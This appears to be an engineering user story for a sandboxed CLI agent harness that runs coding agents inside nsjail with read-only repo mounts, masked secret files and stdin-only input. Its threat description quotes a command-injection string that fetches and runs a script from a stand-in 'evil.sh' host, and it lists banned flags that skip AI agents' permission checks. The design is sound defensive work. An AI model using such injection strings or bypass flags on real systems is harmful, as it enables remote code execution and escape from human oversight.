### User Story
As a **security-first platform engineer running local CLI agent gates (`${context} | agy -p` and `codex -p -s read-only`)**, I need **the `cli_pipe` harness (`agent/runners/cli_pipe.py`) to stream spotlighted `kb-transition-context/v1` YAML over `FD 0 (stdin)` into a zero-shell `execve` `nsjail` sandbox with `MS_RDONLY | MS_NOEXEC` repo bind mounts and `0000` secret/hook whiteout masks** so that **hostile ticket summaries (`$(curl evil.sh|sh)` or `--dangerously-skip-permissions`) can never trigger shell interpolation, bypass CLI sandboxes, mutate the repository, or read `.env*` / `.git/hooks`**.

**Requirement Traceability:** `S14.3` item 1 (direct `execve`, never `/bin/sh -c`, runtime banned-flag re-validation, `codex` pinned `["/usr/local/bin/codex", "-p", "-s", "read-only", ...]`), item 2 (`kb-transition-context/v1` over `FD 0 stdin`, `KANBAN_EPHEMERAL_MCP_TOKEN`), item 3 (4-layer `:ro` repo guarantee: `MS_BIND | MS_REC | MS_RDONLY | MS_NODEV | MS_NOSUID | MS_NOEXEC` at `/workspace/repo`, `0000` tmpfs whiteout masks on `.env*`, `*.pem`, `*.key`, `.git/config`, `.git/hooks`), `S3.5` row "CLI Pipe Injection", `S15.2` (`FixtureCLIRunner` cassettes + malformed stdout + injection strings) | Original requirement `#2` | **Dependencies:** `KB-P5-19a`, `KB-P5-19b`, `KB-P5-16`, `KB-P5-14`

### Scoped Technical Actions
1. **Target Files:**
   - `agent/runners/repo_snapshot.py` (`RoRepoSnapshotManager`, `discover_whiteout_targets()`)
   - `agent/runners/cli_pipe.py` (`CliPipeHarness`, `CLISubprocessRunner` protocol, `NsjailCLISubprocessRunner`, `CliPipeRunMetadata`)
   - `agent/testing/fixtures.py` (extend `FixtureCLIRunner` from `KB-P0-12` if needed to record `received_argv`, `received_stdin`, `received_env_keys`, `mount_spec` and replay stdout/stderr/exit_code/timeout faults from YAML cassettes)
   - `agent/gates/worker.py` (modify: register `"cli_pipe"` in default `HarnessRegistry`)
   - `agent/GEMINI.md` (update `cli_pipe` confinement contract)
2. **Read-Only Repo Snapshot & Whiteout Discovery (`agent/runners/repo_snapshot.py`):**
   - When `agent_def.repo_access_mode == "ro_vfs_mount"` and `repo_context` is provided:
     - Materializes a clean detached snapshot of `repo_context.head_commit` from `repo_context.mirror_path` into `/run/kanban/repo-snapshots/<execution_id>/` (`0700` host parent, snapshot root `0555`) via `asyncio.create_subprocess_exec("git", "--git-dir=" + str(mirror_path), "archive", "--format=tar", head_commit)` extracted in Python `tarfile` with `filter="data"` (rejects absolute paths, `..`, device nodes, FIFOs, setuid bits, and symlinks resolving outside snapshot root).
     - Creates empty stub `.git/HEAD` containing `<head_commit>\n` plus empty `.git/config` and `.git/hooks/` directory so `discover_whiteout_targets()` always masks `.git/config` and `.git/hooks` alongside every matching `.env*`, `*.pem`, `*.key` path found anywhere in the tree (capped at `256` whiteout mounts; if `> 256` secret files exist in repo, fail closed with `REPO_WHITEOUT_LIMIT_EXCEEDED` rather than leaving one unmasked).
     - Cleans up the host staging directory unconditionally in `finally`.
3. **Zero-Shell `nsjail` CLI Execution (`agent/runners/cli_pipe.py`):**
   - **Step 1 - Runtime Policy Gate:** Calls `validated = assert_runtime_argv(agent_def)` (`KB-P5-16`) on every invocation immediately before spawn. Any banned flag (`--yolo`, `--dangerously-*`, `--full-auto`, `--allow-all-tools`) or unpinned `codex` sandbox raises `CliPolicyError` before touching `nsjail` or staging a repo.
   - **Step 2 - Userns Fail-Closed Check:** Calls `probe_nsjail_userns()` (`KB-P5-14`); if unavailable (e.g., standalone `docker run`), raises `SandboxUnavailableError("SANDBOX_UNAVAILABLE_IN_STANDALONE")` and **never** executes `validated.argv` unsandboxed on the host.
   - **Step 3 - `nsjail` Mount & Env Construction (`NsjailCLISubprocessRunner`):**
     - Invokes `/usr/bin/nsjail` via `asyncio.create_subprocess_exec` (`shell=False` always; `validated.argv` passed after `--` separator so `nsjail` `execve`s the binary directly with zero `/bin/sh -c`).
     - Mounts `/workspace/repo` with exact flags translating to `MS_BIND | MS_REC | MS_RDONLY | MS_NODEV | MS_NOSUID | MS_NOEXEC` (`--bindmount_ro` + `noexec,nosuid,nodev` options in generated nsjail protobuf config written to a `0600` temp file).
     - Overlays every path from `discover_whiteout_targets()` (`.env*`, `*.pem`, `*.key`, `.git/config`, `.git/hooks`) with a `0000` empty tmpfs/ro-file whiteout mount inside `/workspace/repo` before `pivot_root`.
     - Seccomp policy: `deploy/seccomp/sandbox-profile.json` (`KB-P5-14`) or CLI-egress variant when MCP HTTP loopback/egress is enabled for the `script-sandbox` network (`sandbox_net` has zero internet route per `S2.4`).
     - Clean environment (`keep_env: false`): sets only `PATH=/usr/local/bin:/usr/bin:/bin`, `HOME=/tmp`, `LANG=C.UTF-8`, and `KANBAN_EPHEMERAL_MCP_TOKEN=<decoded ctx.ephemeral_token>`; copies zero host env vars (`OPENAI_API_KEY`, `GEMINI_API_KEY`, `DATABASE_URL`, `MASTER_KEK`, `LD_PRELOAD` are guaranteed absent).
   - **Step 4 - `FD 0 (stdin)` Streaming & Output Caps:**
     - Writes `ctx.yaml_bytes` directly to child `stdin` (`FD 0`), flushes, and closes `stdin` (`EOF`). Untrusted ticket summary/description NEVER appears in `argv` or env vars.
     - Reads `stdout` up to `1,048,576` bytes (`1 MiB`, matching `KB-P5-19a` `parse_verdict_output` cap; kills child if exceeded -> `CLI_STDOUT_TOO_LARGE`) and `stderr` up to `262,144` bytes (scrubbed via `KB-P2-17`, logged only as byte count + exit code unless `--verbose-tools` in local CLI).
     - Enforces `asyncio.timeout(agent_def.timeout_ms / 1000)` killing process group on expiry -> `GATE_TIMEOUT`.
     - Non-zero exit code without a valid `kb-transition-verdict/v1` on `stdout` raises `CliRunnerExitError(code="CLI_NONZERO_EXIT", exit_code=rc)`.
